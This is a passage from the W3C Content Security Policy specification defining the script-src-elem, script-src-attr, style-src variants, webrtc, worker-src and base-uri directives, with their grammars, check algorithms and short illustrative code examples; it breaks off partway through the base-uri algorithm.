- `script-src-elem` applies to inline checks whose `|type|` is
  \"`script`\" and \"`navigation`\" (and is ignored for inline checks
  whose `|type|` is \"`script attribute`\").

- `script-src-elem`'s
  [value](#directive-value){#ref-for-directive-value③⑤ link-type="dfn"}
  is not used for JavaScript execution sink checks that are gated on the
  \"`unsafe-eval`\" check.

- `script-src-elem` is not used as a fallback for the `worker-src`
  directive. The `worker-src` checks still fall back on the `script-src`
  directive.

##### [6.1.11.1. ]{.secno}[ `script-src-elem` Pre-request check ]{.content}[](#script-src-elem-pre-request){.self-link} {#script-src-elem-pre-request .algorithm .heading .settled algorithm="script-src-elem Pre-request check" level="6.1.11.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①③
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④③
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤②
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `script-src-elem` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Return the result of executing [§ 6.7.1.1 Script directives
    pre-request check](#script-pre-request) on `request`{.variable},
    this directive, and `policy`{.variable}.

##### [6.1.11.2. ]{.secno}[ `script-src-elem` Post-request check ]{.content}[](#script-src-elem-post-request){.self-link} {#script-src-elem-post-request .algorithm .heading .settled algorithm="script-src-elem Post-request check" level="6.1.11.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①④
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④④
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②①
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤③
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `script-src-elem` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Return the result of executing [§ 6.7.1.2 Script directives
    post-request check](#script-post-request) on `request`{.variable},
    `response`{.variable}, this directive, and `policy`{.variable}.

##### [6.1.11.3. ]{.secno}[ `script-src-elem` Inline Check ]{.content}[](#script-src-elem-inline){.self-link} {#script-src-elem-inline .algorithm .heading .settled algorithm="script-src-elem Inline Check" level="6.1.11.3"}

This directive's [inline
check](#directive-inline-check){#ref-for-directive-inline-check⑤
link-type="dfn"} algorithm is as follows:

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element④
link-type="idl"} `element`{.variable}, a string `type`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤④
link-type="dfn"} `policy`{.variable} and a string `source`{.variable}:

1.  Assert: `element`{.variable} is not null or `type`{.variable} is
    \"`navigation`\".

2.  Let `name`{.variable} be the result of executing [§ 6.8.2 Get the
    effective directive for inline
    checks](#effective-directive-for-inline-check) on `type`{.variable}.

3.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `script-src-elem`, and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

4.  If the result of executing [§ 6.7.3.3 Does element match source list
    for type and source?](#match-element-to-source-list) on
    `element`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value③⑥
    link-type="dfn"}, `type`{.variable}, and `source`{.variable} is
    \"`Does Not Match`\", return \"`Blocked`\".

5.  Return \"`Allowed`\".

#### [6.1.12. ]{.secno}[`script-src-attr`]{.content}[](#directive-script-src-attr){.self-link} {#directive-script-src-attr .heading .settled level="6.1.12"}

The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "script-src-attr"
    directive-value = serialized-source-list

The [script-src-attr]{#script-src-attr .dfn .dfn-paneled dfn-type="dfn"
export=""} directive applies to event handlers and, if present, it will
override the `script-src` directive for relevant checks.

##### [6.1.12.1. ]{.secno}[ `script-src-attr` Inline Check ]{.content}[](#script-src-attr-inline){.self-link} {#script-src-attr-inline .algorithm .heading .settled algorithm="script-src-attr Inline Check" level="6.1.12.1"}

This directive's [inline
check](#directive-inline-check){#ref-for-directive-inline-check⑥
link-type="dfn"} algorithm is as follows:

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element⑤
link-type="idl"} `element`{.variable}, a string `type`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤⑤
link-type="dfn"} `policy`{.variable} and a string `source`{.variable}:

1.  Assert: `element`{.variable} is not null or `type`{.variable} is
    \"`navigation`\".

2.  Let `name`{.variable} be the result of executing [§ 6.8.2 Get the
    effective directive for inline
    checks](#effective-directive-for-inline-check) on `type`{.variable}.

3.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `script-src-attr` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

4.  If the result of executing [§ 6.7.3.3 Does element match source list
    for type and source?](#match-element-to-source-list) on
    `element`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value③⑦
    link-type="dfn"}, `type`{.variable}, and `source`{.variable}, is
    \"`Does Not Match`\", return \"`Blocked`\".

5.  Return \"`Allowed`\".

#### [6.1.13. ]{.secno}[`style-src`]{.content}[](#directive-style-src){.self-link} {#directive-style-src .heading .settled level="6.1.13"}

The [style-src]{#style-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the locations from which style may be applied to a
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document⑨
link-type="idl"}. The syntax for the directive's name and value is
described by the following ABNF:

    directive-name  = "style-src"
    directive-value = serialized-source-list

The `style-src` directive governs several things:

1.  Style
    [requests](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④⑤
    link-type="dfn"} MUST pass through [§ 4.1.2 Should request be
    blocked by Content Security
    Policy?](#should-block-request){#ref-for-should-block-request⑤}.
    This includes:

    1.  Stylesheet requests originating from a
        [`link`](https://html.spec.whatwg.org/multipage/semantics.html#the-link-element){#ref-for-the-link-element①
        link-type="element"} element.

    2.  Stylesheet requests originating from the
        [`@import`](https://www.w3.org/TR/css-cascade-5/#at-ruledef-import){#ref-for-at-ruledef-import
        .css link-type="at-rule"} rule.

    3.  Stylesheet requests originating from a `Link` HTTP response
        header field
        [\[RFC8288\]](#biblio-rfc8288 "Web Linking"){link-type="biblio"}.

2.  [Responses](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②②
    link-type="dfn"} to style requests MUST pass through [§ 4.1.3 Should
    response to request be blocked by Content Security
    Policy?](#should-block-response){#ref-for-should-block-response⑤}.

3.  Inline
    [`style`](https://html.spec.whatwg.org/multipage/semantics.html#the-style-element){#ref-for-the-style-element
    link-type="element"} blocks MUST pass through [§ 4.2.3 Should
    element's inline type behavior be blocked by Content Security
    Policy?](#should-block-inline){#ref-for-should-block-inline⑥}. The
    styles will be blocked unless every policy allows inline style,
    either implicitly by not specifying a `style-src` (or `default-src`)
    directive, or explicitly, by specifying \"`unsafe-inline`\", a
    [nonce-source](#grammardef-nonce-source){#ref-for-grammardef-nonce-source③
    link-type="grammar"} or a
    [hash-source](#grammardef-hash-source){#ref-for-grammardef-hash-source③
    link-type="grammar"} that matches the inline block.

4.  The following CSS algorithms are gated on the `unsafe-eval` source
    expression:

    1.  [insert a CSS
        rule](https://www.w3.org/TR/cssom-1/#insert-a-css-rule){#ref-for-insert-a-css-rule
        link-type="dfn"}

    2.  [parse a CSS
        rule](https://www.w3.org/TR/cssom-1/#parse-a-css-rule){#ref-for-parse-a-css-rule
        link-type="dfn"},

    3.  [parse a CSS declaration
        block](https://www.w3.org/TR/cssom-1/#parse-a-css-declaration-block){#ref-for-parse-a-css-declaration-block
        link-type="dfn"}

    4.  [parse a group of
        selectors](https://www.w3.org/TR/cssom-1/#parse-a-group-of-selectors){#ref-for-parse-a-group-of-selectors
        link-type="dfn"}

    This would include, for example, all invocations of CSSOM's various
    `cssText` setters and `insertRule` methods
    [\[CSSOM\]](#biblio-cssom "CSS Object Model (CSSOM)"){link-type="biblio"}
    [\[HTML\]](#biblio-html "HTML Standard"){link-type="biblio"}.

    [](#issue-ba1a0a35){.self-link} This needs to be better explained.
    [\[w3c/webappsec-csp Issue
    #212\]](https://github.com/w3c/webappsec-csp/issues/212)

##### [6.1.13.1. ]{.secno}[ `style-src` Pre-request Check ]{.content}[](#style-src-pre-request){.self-link} {#style-src-pre-request .algorithm .heading .settled algorithm="style-src Pre-request Check" level="6.1.13.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①④
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④⑥
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤⑥
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `style-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.3 Does nonce match source
    list?](#match-nonce-to-source-list) on `request`{.variable}'s
    [cryptographic nonce
    metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata①
    link-type="dfn"} and this directive's
    [value](#directive-value){#ref-for-directive-value③⑧
    link-type="dfn"} is \"`Matches`\", return \"`Allowed`\".

4.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value③⑨
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

5.  Return \"`Allowed`\".

##### [6.1.13.2. ]{.secno}[ `style-src` Post-request Check ]{.content}[](#style-src-post-request){.self-link} {#style-src-post-request .algorithm .heading .settled algorithm="style-src Post-request Check" level="6.1.13.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①⑤
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④⑦
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②③
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤⑦
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `style-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.3 Does nonce match source
    list?](#match-nonce-to-source-list) on `request`{.variable}'s
    [cryptographic nonce
    metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata②
    link-type="dfn"} and this directive's
    [value](#directive-value){#ref-for-directive-value④⓪
    link-type="dfn"} is \"`Matches`\", return \"`Allowed`\".

4.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value④①
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

5.  Return \"`Allowed`\".

##### [6.1.13.3. ]{.secno}[ `style-src` Inline Check ]{.content}[](#style-src-inline){.self-link} {#style-src-inline .algorithm .heading .settled algorithm="style-src Inline Check" level="6.1.13.3"}

This directive's [inline
check](#directive-inline-check){#ref-for-directive-inline-check⑦
link-type="dfn"} algorithm is as follows:

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element⑥
link-type="idl"} `element`{.variable}, a string `type`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤⑧
link-type="dfn"} `policy`{.variable} and a string `source`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.2 Get the
    effective directive for inline
    checks](#effective-directive-for-inline-check) on `type`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `style-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.3.3 Does element match source list
    for type and source?](#match-element-to-source-list) on
    `element`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value④②
    link-type="dfn"}, `type`{.variable}, and `source`{.variable}, is
    \"`Does Not Match`\", return \"`Blocked`\".

4.  Return \"`Allowed`\".

This directive's
[initialization](#directive-initialization){#ref-for-directive-initialization②
link-type="dfn"} algorithm is as follows:

[](#issue-6fa220c3){.self-link} Do something interesting to the
execution context in order to lock down interesting CSSOM algorithms. I
don't think CSSOM gives us any hooks here, so let's work with them to
put something reasonable together.

#### [6.1.14. ]{.secno}[`style-src-elem`]{.content}[](#directive-style-src-elem){.self-link} {#directive-style-src-elem .heading .settled level="6.1.14"}

The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "style-src-elem"
    directive-value = serialized-source-list

The [style-src-elem]{#style-src-elem .dfn .dfn-paneled dfn-type="dfn"
export=""} directive governs the behaviour of styles except for styles
defined in inline attributes.

##### [6.1.14.1. ]{.secno}[ `style-src-elem` Pre-request Check ]{.content}[](#style-src-elem-pre-request){.self-link} {#style-src-elem-pre-request .algorithm .heading .settled algorithm="style-src-elem Pre-request Check" level="6.1.14.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①⑤
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④⑧
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤⑨
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `style-src-elem` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.3 Does nonce match source
    list?](#match-nonce-to-source-list) on `request`{.variable}'s
    [cryptographic nonce
    metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata③
    link-type="dfn"} and this directive's
    [value](#directive-value){#ref-for-directive-value④③
    link-type="dfn"} is \"`Matches`\", return \"`Allowed`\".

4.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value④④
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

5.  Return \"`Allowed`\".

##### [6.1.14.2. ]{.secno}[ `style-src-elem` Post-request Check ]{.content}[](#style-src-elem-post-request){.self-link} {#style-src-elem-post-request .algorithm .heading .settled algorithm="style-src-elem Post-request Check" level="6.1.14.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①⑥
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④⑨
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②④
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥⓪
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `style-src-elem` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.3 Does nonce match source
    list?](#match-nonce-to-source-list) on `request`{.variable}'s
    [cryptographic nonce
    metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata④
    link-type="dfn"} and this directive's
    [value](#directive-value){#ref-for-directive-value④⑤
    link-type="dfn"} is \"`Matches`\", return \"`Allowed`\".

4.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value④⑥
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

5.  Return \"`Allowed`\".

##### [6.1.14.3. ]{.secno}[ `style-src-elem` Inline Check ]{.content}[](#style-src-elem-inline){.self-link} {#style-src-elem-inline .algorithm .heading .settled algorithm="style-src-elem Inline Check" level="6.1.14.3"}

This directive's [inline
check](#directive-inline-check){#ref-for-directive-inline-check⑧
link-type="dfn"} algorithm is as follows:

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element⑦
link-type="idl"} `element`{.variable}, a string `type`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥①
link-type="dfn"} `policy`{.variable} and a string `source`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.2 Get the
    effective directive for inline
    checks](#effective-directive-for-inline-check) on `type`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `style-src-elem` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.3.3 Does element match source list
    for type and source?](#match-element-to-source-list) on
    `element`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value④⑦
    link-type="dfn"}, `type`{.variable}, and `source`{.variable}, is
    \"`Does Not Match`\", return \"`Blocked`\".

4.  Return \"`Allowed`\".

#### [6.1.15. ]{.secno}[`style-src-attr`]{.content}[](#directive-style-src-attr){.self-link} {#directive-style-src-attr .heading .settled level="6.1.15"}

The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "style-src-attr"
    directive-value = serialized-source-list

The [style-src-attr]{#style-src-attr .dfn .dfn-paneled dfn-type="dfn"
export=""} directive governs the behaviour of style attributes.

##### [6.1.15.1. ]{.secno}[ `style-src-attr` Inline Check ]{.content}[](#style-src-attr-inline){.self-link} {#style-src-attr-inline .algorithm .heading .settled algorithm="style-src-attr Inline Check" level="6.1.15.1"}

This directive's [inline
check](#directive-inline-check){#ref-for-directive-inline-check⑨
link-type="dfn"} algorithm is as follows:

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element⑧
link-type="idl"} `element`{.variable}, a string `type`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥②
link-type="dfn"} `policy`{.variable} and a string `source`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.2 Get the
    effective directive for inline
    checks](#effective-directive-for-inline-check) on `type`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `style-src-attr` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.3.3 Does element match source list
    for type and source?](#match-element-to-source-list) on
    `element`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value④⑧
    link-type="dfn"}, `type`{.variable}, and `source`{.variable}, is
    \"`Does Not Match`\", return \"`Blocked`\".

4.  Return \"`Allowed`\".

### [6.2. ]{.secno}[Other Directives]{.content}[](#directives-other){.self-link} {#directives-other .heading .settled level="6.2"}

#### [6.2.1. ]{.secno}[`webrtc`]{.content}[](#directive-webrtc){.self-link} {#directive-webrtc .heading .settled level="6.2.1"}

The [webrtc]{#webrtc .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts whether connections may be established via WebRTC.
The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "webrtc"
    directive-value = "'allow'" / "'block'"

::: {#example-7e4cee69 .example}
[](#example-7e4cee69){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: webrtc 'block'

No local ICE candidates will be surfaced, as no STUN checks will be made
against the ICE server provided to the peer connection negotiated below;
No connectivity-checks will be attempted to any remote candidates
provided by JS; The connectionState will never transition to
\"connected\" and instead transition directly from its initial state of
\"new\" to \"failed\" shortly. Attempts to pc.restartIce() will repeat
this outcome.

``` highlight
 <script>
   const iceServers = [{urls: "stun:stun.l.google.com:19302"}];
   const pc = new RTCPeerConnection({iceServers});
   pc.createDataChannel("");
   const io = new WebSocket('ws://example.com:8080');
   pc.onicecandidate = ({candidate}) => io.send({candidate});
   pc.onnegotiationneeded = async () => {
     await pc.setLocalDescription();
     io.send({description: pc.localDescription});
   };
   io.onmessage = async ({data: {description, candidate}}) => {
     if (description) {
       await pc.setRemoteDescription(description);
       if (description.type == "offer") {
         await pc.setLocalDescription();
         io.send({description: pc.localDescription});
       }
     } else if (candidate) await pc.addIceCandidate(candidate);
   };
</script>
```
:::

##### [6.2.1.1. ]{.secno}[ `webrtc` Pre-connect Check ]{.content}[](#webrtc-pre-connect){.self-link} {#webrtc-pre-connect .algorithm .heading .settled algorithm="webrtc Pre-connect Check" level="6.2.1.1"}

This directive's [webrtc pre-connect
check](#directive-webrtc-pre-connect-check){#ref-for-directive-webrtc-pre-connect-check①
link-type="dfn"} is as follows:

1.  If this directive's
    [value](#directive-value){#ref-for-directive-value④⑨
    link-type="dfn"} contains a single item which is an [ASCII
    case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive⑤
    link-type="dfn"} match for the string
    \"[`'allow'`](#grammardef-allow){#ref-for-grammardef-allow
    link-type="grammar"}\", return \"`Allowed`\".

2.  Return \"`Blocked`\".

#### [6.2.2. ]{.secno}[`worker-src`]{.content}[](#directive-worker-src){.self-link} {#directive-worker-src .heading .settled level="6.2.2"}

The [worker-src]{#worker-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the URLs which may be loaded as a
[`Worker`{.idl}](https://html.spec.whatwg.org/multipage/workers.html#worker){#ref-for-worker②
link-type="idl"},
[`SharedWorker`{.idl}](https://html.spec.whatwg.org/multipage/workers.html#sharedworker){#ref-for-sharedworker①
link-type="idl"}, or
[`ServiceWorker`{.idl}](https://www.w3.org/TR/service-workers/#serviceworker){#ref-for-serviceworker①
link-type="idl"}. The syntax for the directive's name and value is
described by the following ABNF:

    directive-name  = "worker-src"
    directive-value = serialized-source-list

::: {#example-fd6c5849 .example}
[](#example-fd6c5849){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: worker-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `worker-src`'s [source
list](#source-lists){#ref-for-source-lists①⓪ link-type="dfn"}:

``` highlight
<script>
  var blockedWorker = new Worker("data:application/javascript,...");
  blockedWorker = new SharedWorker("https://example.org/");
  navigator.serviceWorker.register('https://example.org/sw.js');
</script>
```
:::

##### [6.2.2.1. ]{.secno}[ `worker-src` Pre-request Check ]{.content}[](#worker-src-pre-request){.self-link} {#worker-src-pre-request .algorithm .heading .settled algorithm="worker-src Pre-request Check" level="6.2.2.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①⑥
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤⓪
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥③
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `worker-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value⑤⓪
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

##### [6.2.2.2. ]{.secno}[ `worker-src` Post-request Check ]{.content}[](#worker-src-post-request){.self-link} {#worker-src-post-request .algorithm .heading .settled algorithm="worker-src Post-request Check" level="6.2.2.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①⑦
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤①
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②⑤
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥④
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `worker-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value⑤①
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

### [6.3. ]{.secno}[ Document Directives ]{.content}[](#directives-document){.self-link} {#directives-document .heading .settled level="6.3"}

The following directives govern the properties of a document or worker
environment to which a policy applies.

#### [6.3.1. ]{.secno}[`base-uri`]{.content}[](#directive-base-uri){.self-link} {#directive-base-uri .heading .settled level="6.3.1"}

The [base-uri]{#base-uri .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the
[`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url⑤
link-type="idl"}s which can be used in a
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document①⓪
link-type="idl"}'s
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element){#ref-for-the-base-element①
link-type="element"} element. The syntax for the directive's name and
value is described by the following ABNF:

    directive-name  = "base-uri"
    directive-value = serialized-source-list

The following algorithm is called during HTML's [set the frozen base
url](https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url){#ref-for-set-the-frozen-base-url①
link-type="dfn"} algorithm in order to monitor and enforce this
directive:

##### [6.3.1.1. ]{.secno}[ Is `base`{.variable} allowed for `document`{.variable}? ]{.content}[](#allow-base-for-document){#ref-for-allow-base-for-document① .self-link} {#allow-base-for-document .algorithm .dfn-paneled .heading .settled algorithm="Is base allowed for document?" dfn-type="dfn" export="" level="6.3.1.1" lt="Is base allowed for document?"}

Given a [`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url⑥
link-type="idl"} `base`{.variable}, and a
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document①①
link-type="idl"} `document`{.variable}, this algorithm returns
\"`Allowed`\" if `base`{.variable} may be used as the value of a
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element){#ref-for-the-base-element②
link-type="element"} element's
[`href`](https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href){#ref-for-attr-base-href①
link-type="element-sub"} attribute, and \"`Blocked`\" otherwise:

1.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②⑧
    link-type="dfn"} `policy`{.variable} of `document`{.variable}'s
    [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object①②
    link-type="dfn"}'s [csp
    list](#global-object-csp-list){#ref-for-global-object-csp-list①⓪
    link-type="dfn"}:

    1.  Let `source list`{.variable} be null.

    2.  If a [directive](#directives){#ref-for-directives②⑥
        link-type="dfn"} whose
        [name](#directive-name){#ref-for-directive-name①⑥
        link-type="dfn"} is \"`base-uri`\" is present in
        `policy`{.variable}'s [directive
        set](#policy-directive-set){#ref-for-policy-directive-set①③
        link-type="dfn"}, set `source list`{.variable} to that
        [directive](#directives){#ref-for-directives②⑦
        link-type="dfn"}'s
        [value](#directive-value){#ref-for-directive-value⑤②
        link-type="dfn"}.

    3.  If `source list`{.variable} is null, skip to the next
        `policy`{.variable}.

    4.  If the result of executing [§ 6.7.2.7 Does url match source list
        in origin with redirect count?](#match-url-to-source-list) on
        `base`{.variable}, `source list`{.variable},
        `policy`{.variable}'s
        [self-origin](#policy-self-origin){#ref-for-policy-self-origin①
        link-type="dfn"}, and `0` is \"`Does Not Match`\":

        1.  Let `violation`{.variable} be the result of executing
            [§ 2.4.1 Create a violation object for global, policy, and
            directive](#create-violation-for-global) on
            `document`{.variable}'s [global
            object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object①③
            link-type="dfn"}, `policy`{.variable}, and
            \"[`base-uri`](#base-uri){#ref-for-base-uri
            link-type="dfn"}\".

        2.  Set `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource①⑦
            link-type="dfn"} to \"`inline`\".

        3.  Execute [§ 5.5 Report a violation](#report-violation) on
            `violation`{.variable}.

        4.  If `policy`{.variable}'s
            [disposition](#policy-disposition){#ref-for-policy-disposition①⑦
